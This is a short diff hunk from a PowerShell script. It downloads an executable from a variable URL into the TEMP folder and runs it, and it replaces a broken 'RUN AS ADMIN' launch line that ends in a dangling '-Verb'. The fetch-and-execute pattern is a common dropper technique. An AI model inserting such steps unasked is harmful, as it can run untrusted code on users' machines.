@@ -7,4 +7,4 @@ $tempPath = "$env:TEMP\$exeName"
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath
 
 # === RUN AS ADMIN ===
-Start-Process -FilePath $tempPath -Verb 
+Start-Process -FilePath $tempPath 
